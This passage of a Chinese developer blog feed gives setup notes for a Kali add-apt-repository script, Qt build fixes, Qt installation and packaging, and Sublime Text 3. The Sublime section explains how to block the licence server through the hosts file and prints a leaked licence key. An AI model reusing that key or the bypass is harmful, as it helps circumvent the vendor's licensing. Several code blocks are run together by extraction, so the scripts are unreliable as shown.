apt-file</code></pre></li><li>更新<code>apt-file</code>。<pre class=" language-shell"><code class="language-shell">apt-file update</code></pre></li><li>apt-file更新完毕，你应该能够搜索它了。<pre class=" language-shell"><code class="language-shell">apt-file search add-apt-repository</code></pre></li><li>你的输出结果应该看起来类似这样：<pre><code>software-properties-common: /usr/bin/add-apt-repositorysoftware-properties-common: /usr/share/man/man1/add-apt-repository.1.gz</code></pre></li><li>模仿Ubuntu，让add-apt-repository正常工作。<pre class=" language-shell"><code class="language-shell">cd /usr/sbingedit add-apt-repository</code></pre></li><li>添加下列代码，并保存文件。<pre class=" language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token keyword">if</span> <span class="token punctuation">[</span> $<span class="token comment" spellcheck="true"># -eq 1 ]</span>NM<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">uname</span> -a <span class="token operator">&amp;&amp;</span> <span class="token function">date</span><span class="token variable">`</span></span>NAME<span class="token operator">=</span>`echo <span class="token variable">$NM</span> <span class="token operator">|</span> md5sum <span class="token operator">|</span> <span class="token function">cut</span> -f1 -d<span class="token string">" "</span><span class="token variable"><span class="token variable">`</span><span class="token keyword">then</span>ppa_name<span class="token operator">=</span><span class="token variable">`</span></span><span class="token keyword">echo</span> <span class="token string">"<span class="token variable">$1</span>"</span> <span class="token operator">|</span> <span class="token function">cut</span> -d<span class="token string">":"</span> -f2 -s`<span class="token keyword">if</span> <span class="token punctuation">[</span> -z <span class="token string">"<span class="token variable">$ppa_name</span>"</span> <span class="token punctuation">]</span><span class="token keyword">then</span>  <span class="token keyword">echo</span> <span class="token string">"PPA name not found"</span>  <span class="token keyword">echo</span> <span class="token string">"Utility to add PPA repositories in your debian machine"</span>  <span class="token keyword">echo</span> <span class="token string">"<span class="token variable">$0</span> ppa:user/ppa-name"</span><span class="token keyword">else</span>  <span class="token keyword">echo</span> <span class="token string">"<span class="token variable">$ppa_name</span>"</span>  <span class="token keyword">echo</span> <span class="token string">"deb http://ppa.launchpad.net/<span class="token variable">$ppa_name</span>/ubuntu xenial main"</span> <span class="token operator">>></span> /etc/apt/sources.list  <span class="token function">apt-get</span> update <span class="token operator">>></span> /dev/null 2<span class="token operator">></span> /tmp/<span class="token variable">${NAME}</span>_apt_add_key.txt  key<span class="token operator">=</span>`cat /tmp/<span class="token variable">${NAME}</span>_apt_add_key.txt <span class="token operator">|</span> <span class="token function">cut</span> -d<span class="token string">":"</span> -f6 <span class="token operator">|</span> <span class="token function">cut</span> -d<span class="token string">" "</span> -f3`  apt-key adv --keyserver keyserver.ubuntu.com --recv-keys <span class="token variable">$key</span>  <span class="token function">rm</span> -rf /tmp/<span class="token variable">${NAME}</span>_apt_add_key.txt<span class="token keyword">fi</span><span class="token keyword">else</span><span class="token keyword">echo</span> <span class="token string">"Utility to add PPA repositories in your debian machine"</span><span class="token keyword">echo</span> <span class="token string">"<span class="token variable">$0</span> ppa:user/ppa-name"</span><span class="token keyword">fi</span></code></pre></li><li><strong>注意</strong>：在<code>echo “deb http://ppa.launchpad.net/$ppa_name/ubuntu xenial main” &gt;&gt; /etc/apt/sources.list</code> 这一行中，我使用了xenial，也就是ubuntu 16.04。你可以根据自己的选择，更改其他代号。现在，使用<code>chmod</code>和<code>chown</code>这两个命令，对文件进行相应的操作。<pre class=" language-shell"><code class="language-shell">chmod +x /usr/sbin/add-apt-repositorychown root:root /usr/sbin/add-apt-repository</code></pre>接下来就可以使用<code>add-apt-repository</code>，添加PPA软件库。我试着输入下面这些命令，安装<code>ssqt5</code>。<pre class=" language-shell"><code class="language-shell">add-apt-repository ppa:hzwhuang/ss-qt5apt updateapt install shadowsocks-qt5</code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> Kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali显卡 </tag>
            
            <tag> kali系统安装 </tag>
            
            <tag> kali安装ss-qt5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Qt遇到的一些坑</title>
      <link href="/2018/11/15/qt-yu-dao-de-yi-xie-keng/"/>
      <url>/2018/11/15/qt-yu-dao-de-yi-xie-keng/</url>
      
        <content type="html"><![CDATA[<blockquote><p>记得重新构建所有项目</p></blockquote><h3 id="Could-not-determine-which-“make”-command-to-run"><a href="#Could-not-determine-which-“make”-command-to-run" class="headerlink" title="Could not determine which “make” command to run"></a>Could not determine which “make” command to run</h3><h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><pre><code>21:48:20: Could not determine which &quot;make&quot; command to run. Check the &quot;make&quot; step in the build configuration.Error while building/deploying project MarkdownPic (kit: Desktop Qt 5.11.1 GCC 64bit)When executing step &quot;qmake&quot;</code></pre><h4 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h4><a id="more"></a><pre><code>sudo apt install cmake g++ gcc gdb</code></pre><p>然后打开<code>qtcreator</code>-&gt;<code>工具</code>-&gt;<code>选项</code>-&gt;<code>构建和运行</code>-&gt;<code>构建套件kit</code>-&gt;<code>自动检测的其中一项</code>-&gt;<code>编译器</code>，给C++也选择一个即可</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1535036707.jpg" alt></p><h3 id="cannot-find-IGL"><a href="#cannot-find-IGL" class="headerlink" title="cannot find -IGL"></a><code>cannot find -IGL</code></h3><h4 id="解决-1"><a href="#解决-1" class="headerlink" title="解决"></a>解决</h4><pre><code>sudo apt install libgl1-mesa-dev</code></pre><h3 id="CURL-OPENSSL-3"><a href="#CURL-OPENSSL-3" class="headerlink" title="CURL_OPENSSL_3"></a><code>CURL_OPENSSL_3</code></h3><h4 id="问题-1"><a href="#问题-1" class="headerlink" title="问题"></a>问题</h4><pre><code>usr/lib/x86_64-linux-gnu/libcurl.so.4: version `CURL_OPENSSL_3&#39; not found</code></pre><h4 id="解决-2"><a href="#解决-2" class="headerlink" title="解决"></a>解决</h4><pre><code># 先试一下下面的sudo apt-get install libcurl4-openssl-dev# 不行再用以下的apt remove -y libcurl4apt install -y libcurl4 curl</code></pre><h3 id="编译提示缺少openssl目录下一些问题件"><a href="#编译提示缺少openssl目录下一些问题件" class="headerlink" title="编译提示缺少openssl目录下一些问题件"></a>编译提示缺少<code>openssl</code>目录下一些问题件</h3><h4 id="问题："><a href="#问题：" class="headerlink" title="问题："></a>问题：</h4><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1535036535.jpg" alt></p><h4 id="解决-3"><a href="#解决-3" class="headerlink" title="解决"></a>解决</h4><pre><code>sudo apt install libssl-dev</code></pre>]]></content>
      
      
      <categories>
          
          <category> Qt </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IGL </tag>
            
            <tag> CURL_OPENSSL_3 </tag>
            
            <tag> Openssl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Qt5安装</title>
      <link href="/2018/11/15/qt5-an-zhuang/"/>
      <url>/2018/11/15/qt5-an-zhuang/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h2 id="安装Qt5"><a href="#安装Qt5" class="headerlink" title="安装Qt5"></a>安装Qt5</h2><ol><li><p><a href="http://download.qt.io/archive/qt/" target="_blank" rel="noopener">点击进入Qt官网</a>下载Qt5,这里我下载的是最新版的<code>Qt5.11</code>,windows平台.</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1527644391_16788_1537332597" alt></p> <a id="more"></a><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1527644458_5328_1537332616" alt></p><blockquote><p>tips:由于文件比较大,最好<code>右键-&gt;复制链接地址-&gt;打开迅雷</code>,用迅雷下载</p></blockquote></li><li><p>下载完成后,双击安装</p></li><li><p>有三个地方要注意</p><ul><li>让你注册登录的时候,可以<code>Skip</code>跳过</li><li>自行修改<code>安装路径</code>最好是<code>英文</code>的</li><li>选择安装组件的时候,要<code>Select All</code></li><li>然后就是一路<code>Next</code>,最后<code>Install</code>了.<blockquote><p>tips:博主在安装过程中,会弹出一个<code>Installer Error</code>的警告,本人是直接点<code>Ignore</code>的,忽略此警告</p></blockquote></li></ul></li><li><p>最后,点击<code>Finish</code>完成</p></li><li><p>自此,Qt5的安装完毕</p></li></ol><h2 id="配置Qt5的环境"><a href="#配置Qt5的环境" class="headerlink" title="配置Qt5的环境"></a>配置Qt5的环境</h2><h3 id="安装windbg"><a href="#安装windbg" class="headerlink" title="安装windbg"></a>安装windbg</h3><blockquote><p>默认情况下是没有<code>调试器</code>的，必须手动下载</p></blockquote><p><a href="https://developer.microsoft.com/zh-cn/windows/hardware/download-windbg" target="_blank" rel="noopener">下载调试器windbg</a>,在安装过程中,<strong>只勾选<code>Debugging Tools for Windows</code>,其他不选</strong></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1527645555_9264_1537332632" alt></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1527645589_21588_1537332640" alt></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1527645789_26375_1537332648" alt></p><h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><ol><li><p>打开 <code>Qt Creator</code>，<code>工具</code>-&gt;<code>选项</code>-&gt;<code>构建和运行</code>-&gt;<code>编译器</code>,进入编译器部分，可以看到 Qt 已经自动检测出来了，不需要手动配置</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1527652433_18573_1537332689" alt></p></li><li><p>而<code>构建套件(Kit)</code>中,已经自动检测出来调试器了</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1527652386_4416_1537332701" alt></p></li></ol><h2 id="VS2017配置"><a href="#VS2017配置" class="headerlink" title="VS2017配置"></a>VS2017配置</h2><h3 id="安装插件Qt-VIsual-Studio-Tools"><a href="#安装插件Qt-VIsual-Studio-Tools" class="headerlink" title="安装插件Qt VIsual  Studio Tools"></a>安装插件Qt VIsual  Studio Tools</h3><ol><li><p>打开VS2017-&gt;<code>工具</code>-&gt;<code>扩展和更新</code></p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1527652808_10732_1537332710" alt></p></li><li><p><code>联机</code>-&gt;搜索框输入<code>Qt</code>-&gt;<code>Qt Visual Studio Tools</code>-&gt;<code>下载</code>,然后就会自动安装了,安装完成会提示重启VS2017</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1527652869_13419_1537332720" alt></p></li><li><p>重启vs2017后,就会看到<code>Qt VS Tools</code>菜单项了</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1527653121_31687_1537332728" alt></p></li></ol><h3 id="插件配置"><a href="#插件配置" class="headerlink" title="插件配置"></a>插件配置</h3><ul><li><p><code>Qt VS Tools</code>-&gt;<code>Qt Options</code>-&gt;<code>Add</code>-&gt;</p><p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1527653495_12074_1537332742" alt></p><p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1527653444_22807_1537332751" alt></p></li></ul><h2 id="4-Helloworld"><a href="#4-Helloworld" class="headerlink" title="4. Helloworld"></a>4. Helloworld</h2><blockquote><p>配置好vs和qt的环境之后,接下来就是测试了,入门第一课:<code>Hello World</code></p></blockquote><p>打开<code>vs2017</code>-&gt;<code>文件</code>-&gt;<code>新建</code>-&gt;<code>项目</code>-&gt;<code>Visual C++</code>-&gt;<code>Qt</code>-&gt;<code>Qt GUI Application</code>-&gt;修改项目名称和位置-&gt;<code>确定</code></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1527653727_2648_1537332766" alt></p><blockquote><p>tips: 要是发现自己没有<code>Visual C++</code>,右键<code>开始菜单</code>-&gt;<code>应用和功能</code>-&gt;<code>Visual Studio Professional 2017</code>-&gt;<code>修改</code>-&gt;找到<code>使用C++的桌面开发</code>-&gt;点击<code>修改</code>即可</p></blockquote><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1527654327_13331_1537332777" alt></p><p>然后就是一路默认就行</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1527653743_10827_1537332797" alt></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1527653765_6383_1537332817" alt></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1527653782_30909_1537332828" alt></p><p>这时候,打开<code>main.cpp</code>,如下</p><pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">"QtHelloWorld.h"</span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;QtWidgets/QApplication></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    QApplication <span class="token function">a</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">)</span><span class="token punctuation">;</span>    QtHelloWorld w<span class="token punctuation">;</span>    w<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> a<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>因为我们要打印一个<code>hello world</code>,所以说,简单改一下<code>main.cpp</code>代码,如下</p><pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;QtWidgets/QApplication></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;QLabel></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    QApplication <span class="token function">a</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">)</span><span class="token punctuation">;</span>    QLabel <span class="token function">label</span><span class="token punctuation">(</span><span class="token string">"hello world"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    label<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> a<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>结果如下:</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1527654005_20624_1537332840" alt></p><h1 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h1><h2 id="安装pyqt5"><a href="#安装pyqt5" class="headerlink" title="安装pyqt5"></a>安装pyqt5</h2><pre class=" language-shell"><code class="language-shell">sudo apt install pyqt5*sudo apt install qt5-defaultsudo apt install qttools5-dev-tools</code></pre><h2 id="设置QtDesigner"><a href="#设置QtDesigner" class="headerlink" title="设置QtDesigner"></a>设置QtDesigner</h2><ul><li>打开pycharm后点击<code>File</code>- &gt; <code>setting</code> - &gt; <code>Tools</code>- &gt; <code>External Tools,</code> 点击 <code>+</code> 号添加两个文件</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1535078798.jpg" alt></p><h3 id="第一个文件—QtDesigner"><a href="#第一个文件—QtDesigner" class="headerlink" title="第一个文件—QtDesigner"></a>第一个文件—<code>QtDesigner</code></h3><pre><code>/usr/bin/designer  # 填入Program$FileDir$  # 填入Working directory</code></pre><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1535078672.jpg" alt></p><h3 id="第二个文件—PyUIC"><a href="#第二个文件—PyUIC" class="headerlink" title="第二个文件—PyUIC"></a>第二个文件—<code>PyUIC</code></h3><pre><code>/usr/bin/python3  # 填入Program-m PyQt5.uic.pyuic  $FileName$ -o $FileNameWithoutExtension$.py  # 填入Arguments$FileDir$  # 填入Working direction</code></pre><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1535078710.jpg" alt></p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><blockquote><p> 在pycharm中的下拉菜单<code>Tools</code>中的<code>Qt5</code>就能看到刚刚定义的两个工具</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Qt </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Qt5安装 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Qt打包</title>
      <link href="/2018/11/15/qt-da-bao/"/>
      <url>/2018/11/15/qt-da-bao/</url>
      
        <content type="html"><![CDATA[<h2 id="Windows打包"><a href="#Windows打包" class="headerlink" title="Windows打包"></a>Windows打包</h2><ol><li>首先我们是生成<code>Release</code>离线文件</li></ol><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530156880.jpg" alt></p><ol start="2"><li>找到项目文件夹下生成的exe文件,如我的是<code>MarkdownPic.exe</code>,将该exe文件复制到一个新的文件夹,比如我将其复制到<code>C:\Users\13612\Dropbox\HMP</code>目录下<a id="more"></a><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530157061.jpg" alt></li></ol><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530157143.jpg" alt></p><ol start="3"><li>开始菜单搜索<code>qt</code>,然后找到<code>Qt 5.11.0 for Desktop</code>,打开运行,如下图</li></ol><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530157277.jpg" alt></p><ol start="4"><li><code>cd</code>到<code>C:\Users\13612\Dropbox\HMP</code>目录<blockquote><p>ps:windows下,要先使用<code>C:</code>,切换到C盘,然后才能<code>cd</code>到C盘的子目录</p></blockquote></li></ol><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530157766.jpg" alt></p><ol start="5"><li>然后执行如下命令进行打包<pre class=" language-cmd"><code class="language-cmd">windeployqt MarkdownPic.exe</code></pre></li></ol><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530157915.jpg" alt></p><p>然后就可以看到如下效果,当然,如果你没有使用第三方的库,这个时候,你可以直接双击<code>MarkdownPic.exe</code>运行了,如果你使用了第三方的库,运行的时候会提示你缺少一些库文件,缺啥补啥就行</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530157948.jpg" alt></p><p>比如我使用了七牛云,就会出现如下的提示</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530158121.jpg" alt></p><p>将<code>dll</code>全部复制到<code>HMP</code>目录下,就可以<strong>正常运行</strong>了</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530158241.jpg" alt></p><ol start="6"><li>接下来就是程序发布阶段,我使用的是<a href="http://enigmaprotector.com/assets/files/enigmavb.exe" target="_blank" rel="noopener">Enigma Virtual Box</a>,它可以将所有东西压缩到一个文件里面.操作如下<br>(1) <code>Browse</code>-&gt;<code>要打包程序</code>,这里是<code>MarkdownPic.exe</code></li></ol><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530158613.jpg" alt></p><p>(2) 将<code>HMP</code>目录下所有文件拖动到Enigma Virtual Box上,拖完后会弹框,选择<code>OK</code>即可,如下图</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530158777.jpg" alt></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530158795.jpg" alt></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530158818.jpg" alt></p><p>(3) 选择<code>Files Options</code>-&gt;勾选<code>Compress Files</code></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530158877.jpg" alt></p><p>(4) 点击<code>Process</code>开始</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530158923.jpg" alt></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530158929.jpg" alt></p><p>(5) 打包完成,如下图,程序打包成了<code>MarkdownPic_boxed.exe</code>,可以拿这个exe去发布了,其他的文件都没有用了.</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530158967.jpg" alt></p><h2 id="Linux打包成Appimage"><a href="#Linux打包成Appimage" class="headerlink" title="Linux打包成Appimage"></a>Linux打包成Appimage</h2><ol><li>Release模式下生成离线文件</li></ol><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1530165009.jpg" alt></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530165094.jpg" alt></p><ol start="2"><li><p>将其复制到一个空文件夹，这里是<code>fabuHMP</code>，然后<code>cd</code>到<code>fabuHMP</code>下</p></li><li><p>使用<code>ldd</code>命令查看依赖库，发现有一个<code>libqiniu.so</code>不是系统自带的库，是第三方库，因此<code>ldd</code>命令在系统库那里找不到，需要添加环境变量，命令如下<br><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1530160436.jpg" alt></p></li></ol><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 用法如下：</span><span class="token function">export</span> LD_LIBRARY_PATH<span class="token operator">=</span>/Path/To/Lib:<span class="token variable">$LD_LIBRARY_PATH</span><span class="token comment" spellcheck="true"># 我的是如下</span><span class="token function">export</span> LD_LIBRARY_PATH<span class="token operator">=</span>/home/hua/Dropbox/MarkdownPic/MarkdownPic-linux:<span class="token variable">$LD_LIBRARY_PATH</span></code></pre><p>此时再执行<code>ldd MarkdownPic</code>，发现可以找到<code>libqiniu.so</code>库了</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530160735.jpg" alt></p><ol start="4"><li>下一步的操作是将所有的依赖库都复制到<code>fabuHMP</code>目录下，一个个复制粘贴太复杂，因此，需要用到shell脚本，如下<pre class=" language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span></code></pre></li></ol><p>exe=”MarkdownPic” # 发布的程序名称<br>des=”/home/hua/fabuHMP” # 你的发布程序存放路径</p><h1 id="将-home-hua-Dropbox-MarkdownPic-MarkdownPic-linux-替换成第三方库所在位置"><a href="#将-home-hua-Dropbox-MarkdownPic-MarkdownPic-linux-替换成第三方库所在位置" class="headerlink" title="将 /home/hua/Dropbox/MarkdownPic/MarkdownPic-linux  替换成第三方库所在位置"></a>将 /home/hua/Dropbox/MarkdownPic/MarkdownPic-linux  替换成第三方库所在位置</h1><p>export LD_LIBRARY_PATH=/home/hua/Dropbox/MarkdownPic/MarkdownPic-linux:$LD_LIBRARY_PATH<br>deplist=$(ldd $exe | awk  ‘{if (match($3,”/“)){ printf(“%s “),$3 } }’)<br>cp $deplist $des</p><pre><code>这时候，所以的依赖库都复制到`fabuHMP`目录下了![](https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530162548.jpg)5. 添加`qmake`环境,编辑`.bashrc`文件</code></pre><p>gedit ~/.bashrc`</p><pre><code>在最后添加如下代码</code></pre><p>#add QT ENV<br>export PATH=/home/hua/Qt5.11.1/5.11.1/gcc_64/bin:$PATH<br>export LD_LIBRARY_PATH=/home/hua/Dropbox/MarkdownPic/MarkdownPic-linux:$LD_LIBRARY_PATH<br>export QT_PLUGIN_PATH=/home/hua/Qt5.11.1/5.11.1/gcc_64/plugins:$QT_PLUGIN_PATH</p><pre><code>重新打开一个终端，运行`qmake -v`,可以看到如下图则成功![](https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530164326.jpg)6. 下载`linuxdeployqt`[打开下载linuxdeployqt](https://github.com/probonopd/linuxdeployqt/releases)![](https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530163077.jpg)重命名为 `linuxdeployqt`,并赋予可执行权限```bashsudo mv linuxdeployqt-continuous-x86_64.AppImage linuxdeployqtchmod +x linuxdeployqt</code></pre><p>移动到目录 <code>/usr/bin</code></p><pre><code>sudo mv linuxdeployqt /usr/bin</code></pre><p>这时候终端执行<code>linuxdeployqt</code>可看到用法</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530163403.jpg" alt></p><ol start="7"><li>执行如下命令即可打包成一个<code>appiamge</code>，将该文件拷贝给其他人即可<pre><code>linuxdeployqt MarkdownPic -appimage</code></pre></li></ol><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530165268.jpg" alt></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530165294.jpg" alt></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530164727.jpg" alt></p><h2 id="mac打包"><a href="#mac打包" class="headerlink" title="mac打包"></a>mac打包</h2><pre><code>pyinstaller --windowed --onefile --clean --noconfirm demo.pypyinstaller --clean --noconfirm --windowed --onefile demo.spec</code></pre>]]></content>
      
      
      <categories>
          
          <category> Qt </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Qt打包 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sublime text 3</title>
      <link href="/2018/11/15/sublime-text-3/"/>
      <url>/2018/11/15/sublime-text-3/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本文来探究一下Ubuntu/Deepin/mac下sublime text 3的安装与配置</p></blockquote><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="下载与安装"><a href="#下载与安装" class="headerlink" title="下载与安装"></a>下载与安装</h3><blockquote><p><a href="http://www.sublimetext.com/docs/3/linux_repositories.html" target="_blank" rel="noopener">点击打开官网</a></p></blockquote><ul><li>终端下运行一下命令即可安装sublime text 3</li></ul><pre class=" language-bash"><code class="language-bash"><span class="token function">wget</span> -qO - https://download.sublimetext.com/sublimehq-pub.gpg <span class="token operator">|</span> <span class="token function">sudo</span> apt-key add -<span class="token function">sudo</span> apt <span class="token function">install</span> apt-transport-https<span class="token keyword">echo</span> <span class="token string">"deb https://download.sublimetext.com/ apt/stable/"</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> /etc/apt/sources.list.d/sublime-text.list<span class="token function">sudo</span> apt update<span class="token function">sudo</span> apt <span class="token function">install</span> sublime-text</code></pre><a id="more"></a><h3 id="激活"><a href="#激活" class="headerlink" title="激活"></a>激活</h3><blockquote><p>一般来说,直接输入下方秘钥即可激活成功,但是,sublime text 3会不定时的访问<code>license.sublimehq.com</code>,去检查秘钥的正确性,因此只能将该网址利用<code>hosts</code>屏蔽掉</p></blockquote><blockquote><p>注意:<strong>先增加<code>Host 屏蔽</code>,然后输入秘钥才行</strong>,以下是<code>hosts</code>文件的位置</p></blockquote><pre><code>* Windows : `c:/windows/system32/drivers/etc/hosts`* Linux/Mac : `/etc/hosts`</code></pre><ul><li>在<code>hosts</code>文件最下面增加如下一行内容</li></ul><pre><code>127.0.0.1       license.sublimehq.com</code></pre><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181209171310.png" alt></p><ul><li>保存退出<code>hosts</code>文件后,即可在sublime中输入秘钥,如下:</li></ul><pre><code>----- BEGIN LICENSE -----sgbteamSingle User LicenseEA7E-11532598891CBB9 F1513E4F 1A3405C1 A865D53F115F202E 7B91AB2D 0D2A40ED 352B269B76E84F0B CD69BFC7 59F2DFEF E267328F215652A3 E88F9D8F 4C38E3BA 5B2DAAE4969624E7 DC9CD4D5 717FB40C 1B9738CF20B3C4F1 E917B5B3 87C38D9C ACCE7DD85F7EF854 86B9743C FADC04AA FB0DA5C0F913BE58 42FEA319 F954EFDD AE881E0B------ END LICENSE ------</code></pre><h2 id="ubuntu-deepin下无法输入中文"><a href="#ubuntu-deepin下无法输入中文" class="headerlink" title="ubuntu/deepin下无法输入中文"></a>ubuntu/deepin下无法输入中文</h2><h3 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h3><blockquote><p>以下方法是最快捷有效的方法,然而,可以输入中文了,但是,选择文件-&gt;右键-&gt;用<code>sublime text 3</code>打开,你会发现打不开文件了.但是先打开sublime,然后在里面选择文件又可以打开</p></blockquote><pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/jfcherng/my_scripts<span class="token function">sudo</span> apt <span class="token function">install</span> -y fcitx<span class="token function">sudo</span> apt update<span class="token function">sudo</span> apt <span class="token function">install</span> -y build-essential libgtk2.0-dev<span class="token function">cd</span> my_scripts/sublime_text/sublime_text_fcitxgcc -Os -shared -o libsublime-imfix.so sublime_imfix.c <span class="token variable"><span class="token variable">$(</span>pkg-config --libs --cflags gtk+-2.0<span class="token variable">)</span></span> -fPIC<span class="token function">sudo</span> <span class="token function">mv</span> -f libsublime-imfix.so /opt/sublime_text<span class="token function">sudo</span> <span class="token function">cp</span> -f subl <span class="token string">"<span class="token variable"><span class="token variable">$(</span><span class="token function">which</span> subl<span class="token variable">)</span></span>"</span><span class="token function">sudo</span> <span class="token function">cp</span> -f sublime_text.desktop /usr/share/applications/<span class="token function">sudo</span> <span class="token function">cp</span> -f sublime_text.desktop /opt/sublime_text</code></pre><h3 id="法二"><a href="#法二" class="headerlink" title="法二:"></a>法二:</h3><pre class=" language-shell"><code class="language-shell">sudo apt update && sudo apt upgradegit clone https://github.com/lyfeyaj/sublime-text-imfix.gitcd sublime-text-imfix && ./sublime-imfix</code></pre><p>完成！<strong>重新启动</strong>后就可以在Sublime Text 3中使用搜狗输入法输入中文了</p><blockquote><p>这里值得一提的是，博主用的是deepin，然后，一旦将st3固定在下面，然后，很快就又不能输入中文了，卸载重装即可</p></blockquote><h2 